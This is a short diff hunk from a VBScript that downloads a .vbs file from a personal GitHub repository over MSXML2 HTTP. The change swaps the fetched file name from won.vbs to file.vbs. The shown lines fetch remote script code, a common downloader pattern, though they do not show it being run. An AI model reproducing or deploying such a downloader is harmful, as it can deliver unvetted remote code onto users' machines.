@@ -14,7 +14,7 @@ End If
 
 ' Descarcă fișierul won.vbs de pe GitHub
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/won.vbs", False
+xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file.vbs", False
 xmlHttp.Send
 
 If xmlHttp.Status = 200 Then
